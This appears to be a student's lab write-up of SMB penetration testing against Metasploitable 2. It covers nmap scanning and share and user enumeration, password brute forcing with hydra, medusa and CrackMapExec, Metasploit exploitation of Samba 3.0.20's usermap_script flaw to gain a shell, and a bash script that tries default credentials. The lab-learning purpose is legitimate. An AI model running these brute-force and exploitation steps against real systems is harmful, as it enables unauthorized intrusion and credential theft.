<h1 align="center"> SMB </h1> 

<img width="1536" height="1024" alt="what-is-smb" src="https://github.com/user-attachments/assets/3de9be1b-8ac3-42bb-8c3d-afd215e39dd8" />

## What is SMB & where it run?
- SMB (Server Message Block) â€” file & printer sharing protocol used by Windows and Samba (Linux).
- Common ports:
  - TCP 445 (direct SMB over TCP) â€” main one today.
  - TCP 139 (NetBIOS-SSN) â€” legacy/NetBIOS-era SMB.
  - UDP 137-138 (NetBIOS name/service/browsing) â€” older environments.
- SMB versions: SMBv1, SMBv2, SMBv3 â€” SMBv1 is insecure and often targeted.


## Scope 
- **Attacker**: Kali Linux (IP: 192.168.127.128)
- **Target**: Metasploitable v2 (192.168.127.129)



# SMB Penetration Testing Methodology

##  Infromation Gathering
### Network Scanning
#### Scan Range
````
nmap -sn -T4 192.168.127.0/24 
````
<img width="805" height="446" alt="image" src="https://github.com/user-attachments/assets/70977d79-d790-494f-8262-82e841c172c9" />

#### Scan details port target
````
nmap -sCV -T4 192.168.127.129
````
<img width="729" height="784" alt="image" src="https://github.com/user-attachments/assets/2b345a18-9406-4917-99bb-a524eec9a3b0" />

<img width="766" height="557" alt="image" src="https://github.com/user-attachments/assets/64d22326-51e5-47d3-8c85-4ce192c91f2a" />

#### Nmap SMB Scan
````
nmap -p 139,445 --open 192.168.127.129
````
<img width="799" height="308" alt="image" src="https://github.com/user-attachments/assets/06e5acd5-dea7-458a-80c7-d4d06f6da192" />


#### SMB service detection
````
nmap -p 139,445 -sV --script smb-os-discovery 192.168.127.0/24
````
<img width="1146" height="549" alt="image" src="https://github.com/user-attachments/assets/85954f1c-7ae2-4f64-8947-b5dc055bb0c3" />


#### Aggressive SMB scanning
````
nmap -p 139,445 -A --script smb* 192.168.127.129
````
<img width="1021" height="767" alt="image" src="https://github.com/user-attachments/assets/2933f023-2db5-4486-bb40-e7387b8e8790" />

<img width="702" height="808" alt="image" src="https://github.com/user-attachments/assets/823588fd-2741-4e44-867a-d1cf9b416f8d" />

<img width="1017" height="770" alt="image" src="https://github.com/user-attachments/assets/6a021688-a28d-4ac1-a733-0de87e869603" />


### SMB Service Enumeration
#### SMB version detection
````
nmap -p 445 --script smb-protocols 192.168.127.129
````
<img width="667" height="362" alt="image" src="https://github.com/user-attachments/assets/2b1ceee3-1a9f-43e3-8e55-baf092f2bd9c" />

#### OS and share information
````
nmap -p 445 --script smb-os-discovery,smb-enum-shares 192.168.127.129
````
<img width="738" height="775" alt="image" src="https://github.com/user-attachments/assets/2ade5ac3-8f1a-4687-a8e6-7579db418204" />

<img width="624" height="522" alt="image" src="https://github.com/user-attachments/assets/e906a738-e344-4a37-ac6f-b43a9e9f6f7f" />


## Enumeration

### Share Enumeration
#### Using smbclient for share listingðŸ˜£
````
smbclient -L //192.168.127.129 -N
````
<img width="943" height="437" alt="image" src="https://github.com/user-attachments/assets/2867b209-1288-4e3d-bd22-e9b7faa13f0c" />


#### Using rpcclient for share enumeration
````
rpcclient -U "" -N 192.168.127.129
  srvinfo
  enumdomusers
  netshareenum
````
<img width="891" height="806" alt="image" src="https://github.com/user-attachments/assets/6f36229b-f64c-48ab-868b-6f614413ecca" />

<img width="324" height="455" alt="image" src="https://github.com/user-attachments/assets/1067a4aa-8117-4cc0-ab22-e7d2f877daf9" />


#### Using enum4linux for comprehensive enumeration
````
enum4linux -a 192.168.127.129
````
<img width="1126" height="772" alt="image" src="https://github.com/user-attachments/assets/85f4e2ae-a77c-4bb9-8321-60db0bdf1191" />

<img width="1188" height="794" alt="image" src="https://github.com/user-attachments/assets/b14d6f58-22cb-40cd-8997-2ee7344a1d5b" />

<img width="1039" height="728" alt="image" src="https://github.com/user-attachments/assets/4d6be3c4-cc28-456f-838d-5ae2bab3c059" />

<img width="1077" height="797" alt="image" src="https://github.com/user-attachments/assets/7200a828-2f50-49e9-bed7-29151c8b7167" />


#### Using CrackMapExec for share enumeration
````
crackmapexec smb 192.168.127.129 --shares
````
<img width="1353" height="98" alt="image" src="https://github.com/user-attachments/assets/976f73ea-7829-4ca7-acc0-b9243bf5a15e" />


### User Enumeration
#### Enumerate users via RPC
````
nmap -p 445 --script smb-enum-users 192.168.127.129
````
<img width="653" height="720" alt="image" src="https://github.com/user-attachments/assets/08369f02-1bc5-47ea-84cf-ab886c075944" />


#### Using rpcclient for user enumeration
````
rpcclient -U "" -N 192.168.127.129
  enumdomusers
  queryuser msfadmin
````
<img width="471" height="737" alt="image" src="https://github.com/user-attachments/assets/34092c9a-a05e-41bc-a9fa-dc421bbe2742" />

<img width="736" height="549" alt="image" src="https://github.com/user-attachments/assets/6e1498ad-3549-47db-bddf-7d99385c3f27" />

#### Using enum4linux for user enumeration
````
enum4linux -U 192.168.127.129
````
<img width="976" height="682" alt="image" src="https://github.com/user-attachments/assets/3887b041-6f31-4b26-bab9-8d822d267aee" />


### Password Policy Discovery

#### Check password policy
````
nmap -p 445 --script smb-security-mode 192.168.127.129
````
<img width="654" height="371" alt="image" src="https://github.com/user-attachments/assets/2403d96c-2a38-4ddf-8318-710ad02370ff" />


#### Using rpcclient
````
rpcclient -U "" -N 192.168.127.129
  getdompwinfo
````
<img width="358" height="129" alt="image" src="https://github.com/user-attachments/assets/7bb4ce0e-e926-49c8-ba46-770d9b9a6d5f" />


#### Using enum4linux
````
enum4linux -P 192.168.127.129
````
<img width="1025" height="702" alt="image" src="https://github.com/user-attachments/assets/2befc54b-05e0-40d3-9823-ee500d6f4760" />

<img width="547" height="741" alt="image" src="https://github.com/user-attachments/assets/d6b178dd-22b4-4f8c-a555-9434123ade19" />
















##  Vulnerability Assessment

### SMB Vulnerability Scanning
#### Scan for common SMB vulnerabilities
````
nmap -p 445 --script smb-vuln* 192.168.127.129
````
<img width="740" height="336" alt="image" src="https://github.com/user-attachments/assets/2ba85a49-327d-4601-ae67-c815cfb7a663" />


#### Check for EternalBlue (MS17-010)
````
nmap -p 445 --script smb-vuln-ms17-010 192.168.127.129
````
<img width="650" height="236" alt="image" src="https://github.com/user-attachments/assets/91067303-e6f9-4291-bf18-6a68bd28267b" />


#### Check for SMB signing
````
nmap -p 445 --script smb2-security-mode 192.168.127.129
````
<img width="658" height="231" alt="image" src="https://github.com/user-attachments/assets/088b16be-9952-4c67-895e-e83be0feaa42" />



#### Comprehensive vulnerability scan
````
nmap -p 445 --script "smb-vuln-* and safe" 192.168.127.129
````
<img width="643" height="235" alt="image" src="https://github.com/user-attachments/assets/530dda58-f6d5-4a23-8132-9e8de7c5d0fc" />



### Manual Vulnerability Testing
#### Test for anonymous access
````
smbclient //192.168.127.129/IPC$ -N
````
<img width="754" height="499" alt="image" src="https://github.com/user-attachments/assets/4a857465-3d4c-4b4b-8346-514316e55ad3" />



### Vulnerability 
````
nmap 192.168.127.129 -p445,139 --script=vuln -sV -d
````
<img width="1256" height="786" alt="image" src="https://github.com/user-attachments/assets/a31482d2-ac99-4eb9-ae01-f70c574e695b" />

<img width="886" height="540" alt="image" src="https://github.com/user-attachments/assets/5b1e8886-bd4e-48ec-ae18-76e2b9be0bab" />






## Authentication Testing

### Password Spraying
#### Using CrackMapExec for password spraying
````
crackmapexec smb 192.168.127.129 -u msfadmin -p /usr/share/wordlists/wordlist.txt --continue-on-success
````
<img width="1342" height="752" alt="image" src="https://github.com/user-attachments/assets/c8da962d-5895-4feb-a1d9-6e4b7b17c6d9" />

<img width="1119" height="511" alt="image" src="https://github.com/user-attachments/assets/bc08ce09-6203-4610-a0b9-17045c08c55e" />

- In this we found `password`


### Brute Force Attacks
#### Using hydra for SMB brute force
````
hydra -l msfadmin -P /usr/share/wordlists/wordlist.txt 192.168.127.129 smb
````
<img width="1056" height="699" alt="image" src="https://github.com/user-attachments/assets/cf186011-8871-43a9-b675-413e2f4a0821" />

<img width="931" height="281" alt="image" src="https://github.com/user-attachments/assets/16409ea5-328d-4c65-903b-2bb9a00c89c9" />

- Now we see the correct password.


#### Using medusa
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt -M smbnt
````
<img width="1056" height="602" alt="image" src="https://github.com/user-attachments/assets/afa036f2-3f57-42bf-a437-4b2011ff7163" />

<img width="1455" height="467" alt="image" src="https://github.com/user-attachments/assets/cc431be7-7c64-4416-b2cd-3abaef00942e" />

- In this we found the correct `password`

#### Using Nmap script
````
nmap -p 445 --script smb-brute 192.168.127.129
````
<img width="610" height="326" alt="image" src="https://github.com/user-attachments/assets/b15101d1-719a-4559-b1f9-1f88d2cdbe25" />


----


## Exploitation


### Enumeration in metasploit before exploit

#### smb version 
````
msfconsole -q
search smb version
````
<img width="996" height="619" alt="image" src="https://github.com/user-attachments/assets/4aec71a6-f69f-4c21-be2c-eea9e7087aef" />

<img width="1007" height="476" alt="image" src="https://github.com/user-attachments/assets/c7732c6a-dd7e-493e-b5eb-66fb13c9e276" />

````
use 103
show options
````
<img width="1002" height="322" alt="image" src="https://github.com/user-attachments/assets/49f0853d-8fab-4c85-bdda-02b09ba95f73" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="1017" height="290" alt="image" src="https://github.com/user-attachments/assets/644a1980-961a-45b5-8191-b065d33c16fc" />

**Note**: 
- RHOST â€” single Remote HOST. Use when a module expects exactly one target IP/hostname.
- RHOSTS â€” plural Remote HOSTS. Use when you want to target many hosts at once (scanners, mass exploits, or when a module supports batching).

RHOSTS was added/standardized so Metasploit modules can accept whole ranges or lists instead of you having to loop manually.

````
run
````
<img width="1027" height="133" alt="image" src="https://github.com/user-attachments/assets/f8a47721-f58f-426d-a8eb-cb769e815acf" />


#### Use searchsploit
##### search for Samba 3.0.20-Debian
````
searchsploit Samba 3.0.20-Debian
````
<img width="1010" height="195" alt="image" src="https://github.com/user-attachments/assets/9685be73-8d1e-40e8-b8c1-df4fa4259ab8" />

##### Search for Samba 3.0.20
````
searchsploit Samba 3.0.20
````
<img width="1008" height="187" alt="image" src="https://github.com/user-attachments/assets/942aee82-c747-4cef-81e3-e6aabb1a0181" />

- It the same.


##### Search exploit
````
search exploit Samba 3.0.20
````
<img width="883" height="178" alt="image" src="https://github.com/user-attachments/assets/c46cd8af-999d-4b91-b11e-c94e2aa2713a" />


##### Search this in browser
- In browser and type this: `Samba 3.0.20 github`
<img width="889" height="653" alt="image" src="https://github.com/user-attachments/assets/0fea883b-d006-4036-8765-ce41cd4d108c" />

- Or go to direct link: https://github.com/h3x0v3rl0rd/CVE-2007-2447
We can do follow this to exploit our target:


##### In metasploit
- After we search exploit:
````
use 0
show options
````
<img width="1010" height="511" alt="image" src="https://github.com/user-attachments/assets/7a6f0573-a0f7-4a87-830c-bdc9744efe0b" />


````
set RHOSTS 192.168.127.129
show options
````
<img width="1008" height="513" alt="image" src="https://github.com/user-attachments/assets/2faf3f4e-7f71-4aec-97ae-2f4a006f0e54" />


#### Exploit into system
````
run
````
<img width="806" height="504" alt="image" src="https://github.com/user-attachments/assets/c9fcd4e0-21e9-46f5-a6ae-bd6b1cc5627a" />

- We got successful to get into system 



### No bug (version)
login SMB Server
1. Username
2. Password


#### In metasploit
- Search users
````
search smb users
````
<img width="1023" height="583" alt="image" src="https://github.com/user-attachments/assets/8e626f04-0bb3-4762-bdd7-ddd9277cf1a2" />

````
use 20
show options
````
<img width="1008" height="489" alt="image" src="https://github.com/user-attachments/assets/ce90edcb-0822-4743-9a5c-4820ecc620bb" />

````
set RHOST 192.168.127.129
show options
````
<img width="1004" height="495" alt="image" src="https://github.com/user-attachments/assets/8e6a6fbf-9523-4317-b338-9b694f564e5c" />


````
run
````
<img width="629" height="102" alt="image" src="https://github.com/user-attachments/assets/f4aa3dcc-8c3e-458e-8f05-ab54149937a2" />


- Scan it with `nmap`
````
cd /usr/share/nmap/scripts/
````
<img width="345" height="50" alt="image" src="https://github.com/user-attachments/assets/da747e52-afa5-4ab4-89d3-1c3520392666" />

````
ls -la | grep smb
````
<img width="601" height="610" alt="image" src="https://github.com/user-attachments/assets/fc657128-ca10-4e79-af97-f688db6ce01f" />

- `ls -la`: This lists all files and directories in the current directory in long format (`-l`) and includes hidden files (`-a`).
- `|`: This is a pipe. It takes the output of the command on the left (`ls -la`) and sends it as input to the command on the right (`grep smb`).
- `grep smb`: : This filters the output and shows only lines that contain the string "smb".


````
nmap 192.168.127.129 --script=smb-enum-users.nse -p139,445 -v -d
````
<img width="1008" height="662" alt="image" src="https://github.com/user-attachments/assets/17f55954-12d0-4a64-89df-d1f40809b08f" />

<img width="494" height="662" alt="image" src="https://github.com/user-attachments/assets/18a887f4-e0e3-4727-ace4-a3cc0cbab8c1" />

````
nmap 192.168.127.129 --script=smb-enum-shares.nse -p139,445 -v -d
````
<img width="1011" height="666" alt="image" src="https://github.com/user-attachments/assets/95cbea2d-611e-4eec-9fef-42aa1ec5ad3c" />

<img width="613" height="659" alt="image" src="https://github.com/user-attachments/assets/8e658f2d-655d-4fcd-b141-a6dfbb114937" />

````
smbclient -L //192.168.127.129 -N
````
<img width="834" height="401" alt="image" src="https://github.com/user-attachments/assets/6bd87f16-7c88-4040-8c5e-21cffd762807" />

- `-L //192.168.127.129`: Lists all available shares on the target IP.
- `-N`: Tells `smbclient` to skip pasword authentication (anonymous login)).

- In this we result the same `nmap script` above.

- mounting or accessing the interesting shares:
````
smbclient //192.168.127.129/tmp -N
````
<img width="470" height="127" alt="image" src="https://github.com/user-attachments/assets/5b9ac9a6-c18b-4f0f-9004-38c6c954968c" />

````
help
l
````
<img width="696" height="680" alt="image" src="https://github.com/user-attachments/assets/988f8fa6-c068-4474-a902-49b77e000964" />

- We use others command to get more information.


#### Use enum4linux
````
enum4linux 192.168.127.129
````
<img width="1027" height="708" alt="image" src="https://github.com/user-attachments/assets/edc10161-4f42-4fa5-8d35-9eb1c72bc275" />

<img width="1010" height="598" alt="image" src="https://github.com/user-attachments/assets/5972a1ea-4fa0-4e6a-a6fc-7ceccb23b4b2" />

#### use smbmap
````
smbmap -H 192.168.127.129
````
<img width="1009" height="696" alt="image" src="https://github.com/user-attachments/assets/0a5e382b-ca32-42ca-a126-54827376e5e4" />
---

### Metasploit Exploitation:
- Exploit with usermap_script
````
search usermap
use 0
show options
````
<img width="999" height="696" alt="image" src="https://github.com/user-attachments/assets/78bf1754-7690-4145-a19e-1854a3795e53" />

````
set RHOST 192.168.127.129
show options
````
<img width="1003" height="452" alt="image" src="https://github.com/user-attachments/assets/e3801ff2-a660-49ec-800c-30b44250193b" />

````
set LHOST 192.168.127.129
show options
````
<img width="1009" height="451" alt="image" src="https://github.com/user-attachments/assets/51d496d4-9a6e-4b09-9561-9cbe609748d4" />

````
exploit
````
<img width="834" height="601" alt="image" src="https://github.com/user-attachments/assets/c0f8d7b9-e6e5-45c5-9ab5-1e41f6df39fc" />

- We got successful to get the target `shell`.

- Check Check for interesting files
````
find / -name "*.txt" -type f 2>/dev/null
````
<img width="658" height="641" alt="image" src="https://github.com/user-attachments/assets/f397d96d-b0e3-49a0-96f0-a096f3649e10" />

<img width="557" height="591" alt="image" src="https://github.com/user-attachments/assets/2344f102-1d91-48fa-a83e-ee3143ed32aa" />

<img width="454" height="159" alt="image" src="https://github.com/user-attachments/assets/6530230a-30d6-4ccb-969c-532b553d3b21" />

<img width="389" height="565" alt="image" src="https://github.com/user-attachments/assets/23e08630-4350-4a39-9faf-d51c00cbf17b" />


---

### Also we can combine it in one:
````
sudo mousepad smb_assessment.sh
sudo chmod +x smb_assessment.sh
````
````
#!/bin/bash

TARGET="192.168.127.129"

echo "[*] Starting SMB assessment of Metasploitable 2 ($TARGET)"

echo "[1] Scanning for SMB services..."
nmap -p 139,445 -sV "$TARGET"

echo "[2] Enumerating shares..."
smbclient -L "//$TARGET" -N

echo "[3] Running comprehensive enum4linux..."
enum4linux -a "$TARGET"

echo "[4] Checking for vulnerabilities..."
nmap -p 445 --script smb-vuln* "$TARGET"

echo "[5] Testing anonymous access..."
smbclient "//$TARGET/tmp" -N -c "ls"

echo "[6] Testing default credentials..."
smbclient "//$TARGET/msfadmin" -U msfadmin%msfadmin -c "ls"

echo "[*] Assessment complete!"
````

- Run this script
````
sudo ,/smb_assessment.sh
````
<img width="588" height="204" alt="image" src="https://github.com/user-attachments/assets/a743a3f2-bbbb-4d59-a331-7caa6c82a832" />

<img width="922" height="647" alt="image" src="https://github.com/user-attachments/assets/9a2fc9d8-3c0f-49ff-82a1-14f0a22d09d5" />




----
=====>> Finished OF SMB
----

## Reference
1. https://www.youtube.com/watch?v=8Ax9wjfUhow&t=69s


----
## Practices in LAB BY: Nin Kanong(k4n0ng)

## Date: 13/10/2025

----
